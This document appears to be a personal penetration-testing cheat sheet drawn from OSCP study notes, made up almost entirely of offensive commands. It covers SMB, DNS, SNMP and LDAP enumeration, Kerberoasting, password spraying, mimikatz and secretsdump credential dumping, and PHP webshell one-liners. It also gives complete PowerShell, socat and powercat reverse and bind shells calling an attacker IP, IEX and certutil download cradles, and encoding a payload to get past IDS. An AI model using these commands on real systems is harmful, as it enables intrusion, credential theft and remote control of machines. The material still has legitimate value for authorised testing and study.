---
description: DUMP OF USEFULL COMMANDS THAT HELP YOU SPEED UP THINGS
---

# USEFULL COMMANDS

**SMB ENUMERATION**

> LOOK FOR OPEN PORTS WITH NMAP SCAN

`nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`

OR `sudo nbtscan -r 10.11.1.0/24`

> Nmap SMB NSE Scripts

Nmap contains many useful NSE scripts that can be used to discover and enumerate SMB services. These scripts can be found in the /usr/share/nmap/scripts directory.

`ls -1 /usr/share/nmap/scripts/smb*`

There will be alot of smb scripts that can use to enumerate this service more and more.

To use a script : specify the command in this manner: `nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227`

> SMB MAP

`smbmap -u anonymous -H $t # ListShares`

> SMB CLIENT

`smbclient -L 192.168.1.40 # List Shares`

`smbclient [\\\\192.168.1.40\\guest](\\\\192.168.1.40\\guest) # to connect to a share`

> CRACKMAPEXEC

Crackmapexec smb IP

Find permisions on the shares

`crackmapexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares`

> PSEXEC.PY

Psexec.py `psexec.py Domainname/username:Password@<ip>`

You can also use metasploit for psexec

`windows/smb/psexec`

***

**DNS ENUMERATION**

_HOST_

> Find IP address of a domain

`host megacorp.com`

> By default, host command looks for A records, but we can also enumarate mailserver records nd TXT records.

`$ host -t mx megacorpone.com` `$ host -t txt megacorpone.com`

Automating the hostname enumeration: `for ip in $(cat wordlistlist.txt); do host $ip.domain.com; done` This will try every hostname and see if it resolves

_DIG_

DIG REVERSE LOOKUP

`dig @10.13.37.10 -x 10.13.37.10`

`dig axfr @10.10.11.158`

`dig ANY @<DNS\_IP> <DOMAIN>`

_Zone transfer_

> A zone transfer is basically a database replication between related DNS servers in which the zone file is copied from a master DNS server to a slave server. The zone file contains a list of all the DNS names configured for that zone. Zone transfers should only be allowed to authorized slave DNS servers but many administrators misconfigure their DNS servers, and in these cases, anyone asking for a copy of the DNS server zone will usually receive one. This is equivalent to handing a hacker the corporate network layout on a silver platter. All the names, addresses, and functionality of the servers can be exposed to prying eyes.

The host command syntax for performing a zone transfer is as follows: `host -l <domain name> <dns server address>` i.e: `host -l megacorpone.com ns1.megacorpone.com`

_DNS RECON_

> DNSRecon193 is an advanced, modern DNS enumeration script written in Python. Running dnsrecon against megacorpone.com using the -d option to specify a domain name, and -t to specify the type of enumeration to perform (in this case a zone transfer), produces the following output:

`dnsrecon -d megacorpone.com -t axfr` :: axfr is domain transfer

> To use dns recon in bruteforce mode

`dnsrecon -d megacorpone.com -D ~/list.txt -t brt` :: brt means bruteforce

_DNS ENUM_

> DNSEnum is another popular DNS enumeration tool. To show a different output, let’s run dnsenum against the zonetransfer.me domain (which is owned by DigiNinja194 and specifically allows zone transfers):

`dnsenum zonetransfer.me`

***

**INVOKE WEB REQUESTS**

`Powershell -c Invoke-WebRequest -Uri "<http://ip:port/file>" -OutFile <path>/filename`

**CERTUTILL**

`certutil.exe -urlcache -f <http://10.0.0.5/40564.exe> bad.exe`

***

**CHECK WHAT IS RUNING ON YOUR PORTS**

`netstat -tulpn | grep :<port>` or `lsof -i:<port>` to kill `kil pid`

`sudo kill -9 $(sudo lsof -t -i:80)`

***

**POWERSHELL EXECUTION POLICY BYPASS**

`powershell -ep bypass`

***

**COPY FILE THROUGH SSH**

`Pscp target@<ip>:<path to file > <path to local >`

***

**KERBRUTE :**

`./kerbute userenum --dc 10.10.12.214 -d LAB.ENTERPRISE.THM usernames.txt -t`

***

**NTML v2 HASH CRACKING** Run responder in kali

```bash
responder -I tun0 -wP
```

can not be used in pass the hash `Hashcat -m 5600 hashes\hash.txt password.txt -o cracked.txt`

From https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/

**NTLM HASH CRACKING**

`Hashcat -m 1000 hash.txt rockyou.txt`

***

**METERPRETER / MSVENOME SHELLS** https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

[https://infinitelogins.com/2020/01/25/msfvenom-reverse- shell-payload-cheatsheet/](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

***

**SNMP**

SNMP is based on UDP, a simple, stateless protocol, and is therefore susceptible to IP spoofing and replay attacks. In addition, the commonly used SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning that SNMP information and credentials can be easily intercepted over a local network.

> Onesixtyone SNMP Check Snmp-walk

_ONESIXTYONE:_

First thing’s first, we need to discover the “Community String” that SNMP is using for verification. To do this we use a tool called onesixtyone.

`onesixtyone -c common-snmp-community-strings-onesixtyone.txt <TARGET>` If we have a list of targets wecan use -i option to pass alist of ips.

!\[\[Pasted image 20220811181152.png]] Openview is the community string

_SNMP Check:_

Enumerate SNMP Syntax: `snmp-check <ip>`

_SNMP-WALK:_

We can probe and query SNMP values using a tool such as snmpwalk provided we at least know the SNMP read-only community string, which in most cases is “public”

* \-c is a comunnity string
* \-v1 specifies version number, change it accordingly
* \-t specifies target.

> Enumerating entire mib tree:

`snmpwalk -c public -v1 -t 10 10.11.1.14`

> Enumerating Windows Users

`snmpwalk -c public -v1 <ip> 1.3.6.1.4.1.77.1.2.25`

> Enumerating Running Windows Processes

`snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2`

> Enumerating Open TCP Ports

`snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3`

> Enumerating Installed Software

`snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2`

!\[\[Pasted image 20220811181321.png]]

***

**Kerberoasting**:

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

> With\[Impacket]:

`python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password>-outputfile <output_TGSs_file>`

> With

[Rubeus](https://github.com/GhostPack/Rubeus)

`.\Rubeus.exe kerberoast /outfile:<output\_TGSs\_file>`

> WithPowershell:

`iex (new-objectNet.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")`

`Invoke-Kerberoast -OutputFormat <TGSs\_format [hashcat | john]> | % { $\_.Hash } | Out-File -Encoding ASCII <output\_TGSs\_file>￿`

> Cracking with dictionary of passwords:

`hashcat -m 13100 --force <TGSs_file><passwords_file>`

`john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>`

https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

From https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

***

**NFS**

_ENUMERATION:_

> USING NMAP

Locate scripts: `ls -1 /usr/share/nmap/scripts/nfs*` We can run all three of these scripts using the wildcard character `*` in the script name: `nmap -p 111 --script nfs* 10.11.1.72`

> SHOWMOUNT

To know which folder has the server available to mount, you an ask it using:

`showmount -e <IP>`

Then mount it using:

`sudo mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock`

You should specify to **use version 2** because it doesn't have any authentication or authorization.

_Example:_

`mkdir /mnt/new_back`

`mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock`

***

**ASREP ROASTING**

Tuesday, August 9, 2022 11:26 PM

***

**PASSWORD SPRAYING**

_Crackmapexec_

`crackmapexec smb <IP> -u users.txt -p passwords.txt` `crackmapexec smb <IP> -u <username> -H hashes.txt`

\*Pass the password attack.

`crackmapexec smb 192.168.51.0/24 -u <username> -d <domain.local> -p <password>`

_pass the hash_ `crackmapexec smb <ip or range> -u "username" -H <hash> --local-auth`

if we have the password we can try psexec.py `psexec.py Domainname/username:Password@<ip>`

_KERBRUTE_

`./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain\users.txt Password123`

`./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman`

***

**SMB FILES DOWNLOAD**

> SMBGET

[SMBGET](https://www.samba.org/samba/docs/current/man-html/smbget.1.html)

`smbget -U sbradley smb://raz0rblack.thm/trash/experiment_gone_wrong.zip`

***

**Secrets dump**

To decode the ntds.dit\
`secretsdump.py LOCAL -ntds ntds.dit -system system.hive | tee ntds.unshadowed`

To dump hashes `secretsdump.py marvel/fcastle:Password@<ip>` It will dump ntml or lsa secrets hashes.

***

**AWK**

Extract onlt the HTML hashes from the ntds file

`awk -F: '{ print $4}' ntds.unshadowed > ntmlhases_from_ntds_unshadowed`

\-F is a field separator `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`

***

**SSTI TEST PAYLOADS**

```
{{7*7}}

${7*7}

<%= 7*7 %>

${{7*7}}

#{7*7}
```

***

**LDAP**

ldapsearch

Extract users

```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```

***

**MIMIKATZ:**

```
step 1 : run mimikatz

./mimikatz

step 2: Assign Privs

privilege::debug


step 3: Dumps the hashes from SAM file

lsadump::lsa /patch 
 or 
sekurlsa::logonpasswords


```

***

**START A SERVICE**

`sudo systemctl start <service>`

***

**ENABLE A SERVICE**

`sudo systemctl enable <service>`

***

**DELETE A PACKAGE**

`apt remove -purge <name>`

***

**INSTALL A DEB PACKAGE**

`sudo dpkg -i <path to .deb package>`

> \-i means install

***

**RUN DOCKER**

`docker run -Pit alpine`

Connect to a running container Get container ID by ps command

`docker exec -it c0a64a77b9d4 bash`

***

**WIRESHARK**

\`Using Wireshark, you can open the file. Once the file is loaded, you should be able to right-click and select "Follow TCP Stream" as you did in the previous exercise.

Filter: `tcp.port == <portnumber>`

***

**GIT DUMPER**

install `pip install git-dumper`

Run `git-dumper http://siteisup.htb/dev/.git/ <dir/path>` `git log` to see commits

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

***

**Ping Sweep**

To perform a ping sweep or find alive hosts on a network,

* `fping -a -g network/CIDR 2>/dev/null`
* `nmap -sn network/CIDR`

***

**Listening Ports**

To check listening ports and current TCP connections on host,

On linux, `netstat -tunp`

On windows, `netstat -ano`

***

**Advance Google Search**

To use Google dorks,

* `site:`
* `intitle:`
* `inurl:`
* `filetype:`
* `AND, OR, &, |, -`



***

**MSVENOME**

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

***

**SUDO**

Execute some binary by the privs of the other user

`sudo -u username /path`

***

**WORDLIST GENERATOR**

https://github.com/digininja/CeWL

`cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt`

***

**ZIP ANALYSIS**

List content in the zip `7z l <filename>`

Technical info about zip

`7z l -slt <file>`

Unzip tar.gz file `tar -xvzf < file>`

***

**SSH PORT FORWARDING**

\`SSH Portforwarding 8500: ( Change Machine\_IP )

> \-L \[bind\_address:]port:host:hostport

`ssh -L 8500:0.0.0.0:8500 developer@Machine_IP`

`ssh -L 7000:0.0.0.0:7000 ctf-eefe14d3d512@44.203.75.158`

```bash
┌──(kali㉿kali)-[~/Desktop/ctfs/ssh]
└─$ ssh -L 80:cyphersecurity.tech:8989 root@cyphersecurity.tech -i bup-private-linux 
```

CHISEL PORT FORWARDING ON ATTACKER

```bash
chisel server --reverse --port 9999
```

ON WINDOWS

```bash
 > .\chisel.exe client <attackerip>:9999 R:8000:127.0.0.1:8000
```

> BOOK OSCP PAGE 600-603

It explains more information about how to access the smb shares with port forwarding.

_SSH REMORTE PORT FORWRDING_

> ssh -N -R \[bind\_address:]port:host:hostport \[username@address]

!\[\[Pasted image 20221107130650.png]]

> BOOK OSCP 603-605

***

**SHELL STABILIZING**

python2:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

python3:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

***

**NOPASSWD SUDO LD PRELOAD**

https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/

***

**PING SWEEP**

`for i in {1..256}; do ping -c 1 10.0.1.$i | fgrep ttl & done 2>/dev/null | sed -e 's/^.*from //' -e 's/:.*$//' | sort -n -t. -k4`

***

**START A SMBSERVER**

`sudo python3 impacket<path>/smbserver.py <directorypath>`

***

**BYCRYPT HASH CRACKING**

`hashcat -m 3200 hashes /opt/lists/rockyou.txt`

***

**PHP BACKDOORS**

`<?_php_ echo passthru($_GET['cmd']); ?>` `<?_php_ echo system($_GET['cmd']); ?>` `<?php echo file_get_contents('/home/carlos/secret'); ?>` https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php

***

**GREP**

`cat file | grep zip`

\`the most commonly used switches include -r for recursive searching and -i to ignore text case.

***

**TRANSFER FILE WITH NETCAT** On Windows we need to set up a listner `nc -lnvp 4444 > incomming.exe` ON ATTACKER `nc -nv windows.ip 4444 < /usr/share/windows-resources/binaries/wget.exe`

> '<' options throughs file towrads the windows

***

**TRANSFER FILES WITH SOCAT** On attacker side, share the file you want to send. `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`

On Windows `socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`

***

**SOCAT REVERSE SHELLS:** On attacker side set up a listner: \`socat -d -d TCP4-LISTEN:443 STDOUT

On Victims: `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

***

**SOCAT ENCRYPTED SHELL**

> To add encryption to a bind shell, we will rely on Secure Socket Layer85 certificates. This level of encryption will assist in evading intrusion detection systems (IDS)86 and will help hide the sensitive data we are transceiving.

Generate a ssl certificate: `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 2 -out bind_shell.crt`

Comdine these files in a pem file so socat can accept it. `cat bind_shell.key bind_shell.crt > bind_shell.pem`

```
req: initiate a new certificate signing request
-newkey: generate a new private key 
rsa:2048: use RSA encryption with a 2,048-bit key length. 
-nodes: store the private key without passphrase protection 
-keyout: save the key to a file 
-x509: output a self-signed certificate instead of a certificate request 
-days: set validity period in days 
-out: save the certificate to a file
```

After that start a listner; \`\` `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash`

On victims side: `socat - OPENSSL:10.11.0.4:443,verify=0`

***

**TRANSFER FILES WITH POWERSHELL:** **INVOKE WEB REQUESTS**

`Powershell -c Invoke-WebRequest -Uri "<http://ip:port/file>" -OutFile <path>/filename`

**CERTUTILL**

`certutil.exe -urlcache -f <http://10.0.0.5/40564.exe> bad.exe`

Anotherway: \`powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

***

**POWERSHELL REVERSE SHELL**

Start a listner: `sudo nc -lnvp 443` On victims:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10. 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"`

***

**POWERSHELL BIND SHELLS**

As we know on victim, we need to start a listner: `powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"`

On attacker side, we can connect to it using netcat: `$ nc -nv 10.11.0.22 443`

***

**POWERCAT**

> Powercat96 is essentially the PowerShell version of Netcat written by besimorhino.97 It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells.

Load POWERCAT by `. .\Powercat.ps1`

***

**POWERCAT FILE TRANSFER**

First start a netcat on a device you want to reciever the file

`sudo nc -lnvp 443 > Recieving_file.txt`

On sender, Invoke Powercat. `powercat -c RecieverIP -p 443 -i C:\Users\Offsec\file-to_send.txt`

***

**POWERCAT REVERSE SHELLS** On Attacker side setup a netct listner `sudo nc -lnvp 443`

On victim side: `powercat -c Attackerip -p <listning port> -e cmd.exe`

***

**POWERCAT BIND SHELLS**

On victim side we will start a listner: `Powercat -l -p 443 -e cmd.exe` On attacker side we will make a netcat connection `nc -nv <victim ip> <listningport>`

***

**POWERCAT STAND ALONE PAYLOAD**

> Powercat can also generate stand-alone payloads.99 In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. Let’s experiment with payloads in this next example.

On attacker side, start a listner : `sudo nc -lnvp 443`

On victim side: `powercat -c Attackerip -p 443 -e cmd.exe -g > reverseshell.ps1` After that run the file : `./reverseshell.ps1`

> Base 64 encoded to bypass IDS

`powercat -c <attackerip> -p 443 -e cmd.exe -ge > encodedreverseshell. ps1`

> The file will contain an encoded string that can be executed using the PowerShell -E (EncodedCommand) option. However, since the -E option was designed as a way to submit complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be executed in the same way as our unencoded payload. Instead, Bob needs to pass the whole encoded string to powershell.exe -E:

`powershell.exe -E encoded payload strings`

***

**TCP DUMP**

> Tcpdump106 is a text-based network sniffer that is streamlined, powerful, and flexible despite the lack of a graphical interface. It is by far the most commonly-used command-line packet analyzer and can be found on most Unix and Linux operating systems, but local user permissions determine the ability to capture network traffic

\*Analysing a pcap filethrough tcpdump

Open pcap file in comand line: `sudo tcpdump -r password_cracking_filtered.pcap`

Filtering Trafic `sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3 }' | sort | uniq -c | head`

***

**SMTP ENUMERTAION** Port 25

> We can also gather information about a host or network from vulnerable mail servers. The Simple Mail Transport Protocol (SMTP)216 supports several interesting commands, such as VRFY and EXPN. A VRFY request asks the server to verify an email address, while EXPN asks the server for the membership of a mailing list. These can often be abused to verify existing users on a mail server, which is useful information during a penetration test. Consider this example.

Connect using netcat: `nc -nv <IP> <PORT>`

VRFY: After connection run : `VRFY` root or any syspected username

> Using metasploit

`auxiliary/scanner/smtp/smtp_enum`

> NMAP SCRIPTS

```bash
ls /usr/share/nmap/scripts/smtp*
/usr/share/nmap/scripts/smtp-brute.nse       /usr/share/nmap/scripts/smtp-strangeport.nse
/usr/share/nmap/scripts/smtp-commands.nse    /usr/share/nmap/scripts/smtp-vuln-cve2010-4344.nse
/usr/share/nmap/scripts/smtp-enum-users.nse  /usr/share/nmap/scripts/smtp-vuln-cve2011-1720.nse
/usr/share/nmap/scripts/smtp-ntlm-info.nse   /usr/share/nmap/scripts/smtp-vuln-cve2011-1764.nse
/usr/share/nmap/scripts/smtp-open-relay.nse
```

> GET NTML AUTH IF SERVER SUPPORTS IT

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#ntlm-auth-information-disclosure

> RECOURSES

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

***

***

**FILE TRANSFERS**

The term post-exploitation refers to the actions performed by an attacker once they have gained some level of control of a target. Some post-exploitation actions include elevating privileges, expanding control into additional machines, installing backdoors, cleaning up evidence of the attack, uploading files and tools to the target machine, etc. In this module, we will explore various file transfer methods that can assist us in our assessment when properly used under specific conditions!.

_The Non-Interactive Shell_

Most Netcat-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or su and sudo tend to work poorly, if at all. Noninteractive shells also lack useful features like tab completion and job control. An example will help illustrate this problem!

_Upgrading a Non-Interactive Shell_

Now that we understand some of the limitations of non-interactive shells, let’s examine how we can “upgrade” our shell to be far more useful. The Python interpreter, frequently installed on Linux systems, comes with a standard module named pty that allows for creation of pseudo-terminals.

> PYTHON2&3

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

***

**Transfering Files to Windows:**

_TRANSFER FILES WITH POWERSHELL:_

> INVOKE WEB REQUESTS

`Powershell -c Invoke-WebRequest -Uri "<http://ip:port/file>" -OutFile <path>/filename`

> CERTUTILL

`certutil.exe -urlcache -f <http://10.0.0.5/40564.exe> bad.exe`

> ANOTHER WAY

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`

`powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://10.11.0.4/helloworld.ps1')`

> MAKE A PowerShell SCRIPT TO DOWNLOAD

* Change the IP to your attacker machine.

```powershell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

* Run this script with execution policy bypass.

`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1`

_Downloads Using Scripting Languages_

We can leverage scripting engines such as VBScript397 (in Windows XP, 2003) and PowerShell (in Windows 7, 2008, and above) to download files to our victim machine.

Use these set of commands to make a vbs script that downloads.

```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs
```

We can run this (with cscript) to download files from our Kali machine:

`C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe`

> Downloads with exe2hex and PowerShell

Starting on our Kali machine, we will compress the binary we want to transfer, convert it to a hex string, and embed it into a Windows script.

```bash
We’ll start by locating and inspecting the nc.exe file on Kali Linux.

kali@kali:~$ locate nc.exe | grep binaries 
/usr/share/windows-resources/binaries/nc.exe 

kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe . 

kali@kali:~$ ls -lh nc.exe 
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe
```

Although the binary is already quite small, we will reduce the file size to show how it’s done. We will use upx, an executable packer (also known as a PE compression tool):

```bash
kali@kali:~$ upx -9 nc.exe 

Ultimate Packer for eXecutables
Copyright (C) 1996 - 2018 
UPX 3.95 Markus Oberhumer, Laszlo Molnar & John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 59392 -> 29696 50.00% win32/pe nc.exe Packed 1 file. 

kali@kali:~$ ls -lh nc.exe 

-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe
```

Now that our file is optimized and ready for transfer, we can convert nc.exe to a Windows script (.cmd) to run on the Windows machine, which will convert the file to hex and instruct powershell.exe to assemble it back into binary. We’ll use the excellent exe2hex tool for the conversion process:

```bash
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd 
[*] exe2hex v1.5.1 
[+] Successfully wrote (PoSh) nc.cmd
```

This creates a script named nc.cmd. Now cat the file and copy all of its content . After that paste into the target shell you have! .
